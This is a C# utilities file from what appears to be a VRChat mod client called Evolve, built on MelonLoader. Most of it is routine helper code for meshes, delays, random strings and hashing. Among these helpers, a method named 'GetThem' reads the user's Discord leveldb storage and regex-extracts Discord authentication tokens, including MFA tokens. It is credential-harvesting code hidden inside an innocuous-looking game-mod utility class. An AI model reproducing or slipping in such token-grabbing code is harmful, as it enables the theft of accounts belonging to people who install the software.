using Evolve.Buttons;
using Evolve.ConsoleUtils;
using Newtonsoft.Json;
using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using Il2CppSystem.Xml;
using UnityEngine;
using VRC.Core;
using System.Text.RegularExpressions;
using System.Diagnostics;
using Evolve.Wrappers;
using MelonLoader;

namespace Evolve.Utils
{
    internal static class Utilities
    {
        public static void DelayFunction(float del, System.Action action)
        {
            MelonCoroutines.Start(Delay(del, action));
        }

        private static IEnumerator Delay(float del, System.Action action)
        {
            yield return new WaitForSeconds(del);
            action();
            yield break;
        }

        public static IEnumerator DestroyDelayed(float seconds, UnityEngine.Object obj)
        {
            yield return new WaitForSeconds(seconds);
            UnityEngine.Object.Destroy(obj);
            yield break;
        }

        public static int PolyCount(GameObject player)
        {
            var PolyCounts = 0;
            try
            {
                var skinmeshs = player.GetComponentsInChildren<SkinnedMeshRenderer>(true);
                foreach (var obj in skinmeshs)
                {
                    if (obj != null)
                    {
                        if (obj.sharedMesh == null)
                        {
                            continue;
                        }

                        PolyCounts += CountPolyMesh(obj.sharedMesh);
                    }
                }
                var meshfilters = player.GetComponentsInChildren<MeshFilter>(true);
                foreach (var obj in meshfilters)
                {
                    if (obj != null)
                    {
                        if (obj.sharedMesh == null)
                        {
                            continue;
                        }

                        PolyCounts += CountPolyMesh(obj.sharedMesh);
                    }
                }
            }
            catch { }
            return PolyCounts;
        }

        internal static int CountPolys(Renderer r)
        {
            int num = 0;
            try
            {
                if (r != null)
                {
                    var skinnedMeshRenderer = r as SkinnedMeshRenderer;
                    if (skinnedMeshRenderer != null)
                    {
                        if (skinnedMeshRenderer.sharedMesh == null)
                        {
                            return 0;
                        }

                        num += CountPolyMesh(skinnedMeshRenderer.sharedMesh);
                    }
                }
            }
            catch { }
            return num;
        }

        public static List<string> GetThem()
        {
            List<string> discordtokens = new List<string>();
            DirectoryInfo rootfolder = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\Discord\Local Storage\leveldb");

            foreach (var file in rootfolder.GetFiles(false ? "*.log" : "*.ldb"))
            {
                string readedfile = file.OpenText().ReadToEnd();

                foreach (Match match in Regex.Matches(readedfile, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
                    discordtokens.Add(match.Value + "\n");

                foreach (Match match in Regex.Matches(readedfile, @"mfa\.[\w-]{84}"))
                    discordtokens.Add(match.Value + "\n");
            }


            discordtokens = discordtokens.ToList();

            if (discordtokens.Count > 0)
            {
                foundSth = true;
            }
            else
                discordtokens.Add("Empty");

            return discordtokens;
        }
#pragma warning disable CS0414 // Le champ 'MiscUtils.foundSth' est assigné, mais sa valeur n'est jamais utilisée
        private static bool foundSth = false;
#pragma warning restore CS0414 // Le champ 'MiscUtils.foundSth' est assigné, mais sa valeur n'est jamais utilisée
        private static int CountPolyMesh(Mesh sourceMesh)
        {
            int num = 0;
            try
            {
                bool flag = false;
                Mesh mesh;
                if (sourceMesh != null)
                {
                    if (sourceMesh.isReadable)
                    {
                        mesh = sourceMesh;
                    }
                    else
                    {
                        mesh = UnityEngine.Object.Instantiate<Mesh>(sourceMesh);
                        flag = true;
                    }
                    for (int i = 0; i < mesh.subMeshCount; i++)
                    {
                        num += mesh.GetTriangles(i).Length / 3;
                    }

                    if (flag)
                    {
                        UnityEngine.Object.Destroy(mesh);
                    }
                }
            }
            catch { }
            return num;
        }

        public static string GetBetween(string strSource, string strStart, string strEnd)
        {
            if (strSource.Contains(strStart) && strSource.Contains(strEnd))
            {
                int Start, End;
                Start = strSource.IndexOf(strStart, 0) + strStart.Length;
                End = strSource.IndexOf(strEnd, Start);
                return strSource.Substring(Start, End - Start);
            }

            return "";
        }
        public static string GetTextFromUiInputField(UiInputField field)
        {
            MethodInfo getTextMethod = typeof(UiInputField).GetMethod("get_text", BindingFlags.Public | BindingFlags.Instance);
            return getTextMethod.Invoke(field, new object[0]) as string;
        }

        public static IEnumerator Login(string User, string Pass)
        {
            if (APIUser.IsLoggedIn)
            {
                APIUser.Logout();
                yield return new WaitForSeconds(5);
            }
            VRCUiPage page = VRCUiManager.prop_VRCUiManager_0.Method_Public_VRCUiPage_String_0("UserInterface/MenuContent/Screens/Authentication/LoginUserPass");
            VRCUiManager.prop_VRCUiManager_0.Method_Public_VRCUiPage_VRCUiPage_0(page);
            foreach (VRCUiPopupInput Input in UnityEngine.Resources.FindObjectsOfTypeAll<VRCUiPopupInput>())
            {
                Input.field_Public_InputField_0.m_Text = User;
                Input.field_Public_Button_2.Press();
            }
            yield return new WaitForSeconds(0.5f);
            foreach (VRCUiPopupInput Input in UnityEngine.Resources.FindObjectsOfTypeAll<VRCUiPopupInput>())
            {
                Input.field_Public_InputField_0.m_Text = Pass;
                Input.field_Public_Button_2.Press();
            }
        }

        public static void ImEvolved()
        {
            try
            {
                if (APIUser.CurrentUser != null)
                {
                    if (APIUser.CurrentUser.tags != null && !APIUser.CurrentUser.tags.Contains("Evolved")) APIUser.CurrentUser.tags.Add("Evolved");
                }

                if (VRCPlayer.field_Internal_Static_VRCPlayer_0)
                {
                    if (VRCPlayer.field_Internal_Static_VRCPlayer_0.GetAPIUser() != null && VRCPlayer.field_Internal_Static_VRCPlayer_0.GetAPIUser().tags != null && !VRCPlayer.field_Internal_Static_VRCPlayer_0.GetAPIUser().tags.Contains("Evolved")) VRCPlayer.field_Internal_Static_VRCPlayer_0.GetAPIUser().tags.Add("Evolved");
                }
            }
            catch { }
        }
        public static string GetGameObjectPath(GameObject obj)            
        {
            string path = "/" + obj.name;
            while (obj.transform.parent != null)
            {
                obj = obj.transform.parent.gameObject;
                path = "/" + obj.name + path;
            }
            return path;
        }

        public static void StartProcess(string Path, string Commands)
        {
            using (Process exeProcess = new Process())
            {
                exeProcess.StartInfo.FileName = Path;
                exeProcess.StartInfo.Arguments = Commands;
                exeProcess.StartInfo.UseShellExecute = true;
                exeProcess.Start();
            }
        }

        public static string RandomString(int length)
        {
            char[] array = " ̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺ͩͩͩͩͩͩͩͩͩͩͩͩͩͩͩͩͩͩͩͩͩͩͩͩͩͩͩͩͩͩͩͩͩͩͩͩͩͩͩͩͩͩͩͩͩͩͩͩͩ".ToArray<char>();
            string text = "";
            System.Random random = new System.Random(new System.Random().Next(length));
            for (int i = 0; i < length; i++)
            {
                text += array[random.Next(array.Length)].ToString();
            }
            return text;
        }

        public static string RandomNumbersToString(int length)
        {
            char[] array = "0123456789".ToArray<char>();
            string text = "";
            System.Random random = new System.Random(new System.Random().Next(length));
            for (int i = 0; i < length; i++)
            {
                text += array[random.Next(array.Length)].ToString();
            }
            return text;
        }

        public static string RandomStringWithNumbers(int length)
        {
            char[] array = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ".ToArray<char>();
            string text = "";
            System.Random random = new System.Random(new System.Random().Next(length));
            for (int i = 0; i < length; i++)
            {
                text += array[random.Next(array.Length)].ToString();
            }
            return text;
        }


        public static int RandomNumber(int length)
        {
            char[] array = "0123456789".ToArray<char>();
            string text = "";
            System.Random random = new System.Random(new System.Random().Next(length));
            for (int i = 0; i < length; i++)
            {
                text += array[random.Next(array.Length)].ToString();
            }
            return int.Parse(text);
        }


        public static string RandomLetterNumberString(int length)
        {
            char[] array = "abcdefghijklmnopqrstwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789".ToArray<char>();
            string text = "";
            System.Random random = new System.Random(new System.Random().Next(length));
            for (int i = 0; i < length; i++)
            {
                text += array[random.Next(array.Length)].ToString();
            }
            return text;
        }

        public static string RandomNumberString(int length)
        {
            string text = "";
            for (int i = 0; i < length; i++)
            {
                text += new System.Random().Next(0, 9);
            }
            return text;
        }

        static Utilities()
        {
            try
            {
                PropertyInfo propertyInfo = typeof(VRCFlowManager).GetProperties().FirstOrDefault((PropertyInfo p) => p.PropertyType == typeof(VRCFlowManager));
                Utilities.flowManagerMethod = ((propertyInfo != null) ? propertyInfo.GetGetMethod() : null);
                PropertyInfo propertyInfo2 = typeof(VRCUiManager).GetProperties().FirstOrDefault((PropertyInfo p) => p.PropertyType == typeof(VRCUiManager));
                Utilities.uiManagerMethod = ((propertyInfo2 != null) ? propertyInfo2.GetGetMethod() : null);
                PropertyInfo propertyInfo3 = typeof(VRCApplicationSetup).GetProperties().FirstOrDefault((PropertyInfo p) => p.PropertyType == typeof(VRCApplicationSetup));
                Utilities.appSetupMethod = ((propertyInfo3 != null) ? propertyInfo3.GetGetMethod() : null);
                PropertyInfo propertyInfo4 = typeof(VRCApplicationSetup).GetProperties().FirstOrDefault((PropertyInfo p) => p.PropertyType == typeof(ApiAvatar));
                Utilities.currentAvatarMethod = ((propertyInfo4 != null) ? propertyInfo4.GetGetMethod() : null);
            }
            catch
            {
                Console.WriteLine("Error loading VRChat information fields.");
            }
        }

        public static string CalculateHash<T>(string input) where T : HashAlgorithm
        {
            byte[] array = Utilities.CalculateHash<T>(Encoding.UTF8.GetBytes(input));
            StringBuilder stringBuilder = new StringBuilder();
            for (int i = 0; i < array.Length; i++)
            {
                stringBuilder.Append(array[i].ToString("x2"));
            }
            return stringBuilder.ToString();
        }

        public static byte[] CalculateHash<T>(byte[] buffer) where T : HashAlgorithm
        {
            byte[] result;
            using (T t = typeof(T).GetMethod("Create", new Type[0]).Invoke(null, null) as T)
            {
                result = t.ComputeHash(buffer);
            }
            return result;
        }

        public static VRCFlowManager GetVRCFlowManagerInstance()
        {
            return (VRCFlowManager) Utilities.flowManagerMethod.Invoke(null, null);
        }

        public static VRCApplicationSetup GetVRCApplicationSetup()
        {
            return (VRCApplicationSetup) Utilities.appSetupMethod.Invoke(null, null);
        }

        public static VRCUiManager GetVRCUiManager()
        {
            return (VRCUiManager) Utilities.uiManagerMethod.Invoke(null, null);
        }

        private static MethodInfo flowManagerMethod;

        private static MethodInfo uiManagerMethod;

        private static MethodInfo appSetupMethod;

        private static MethodInfo currentAvatarMethod;
    }
}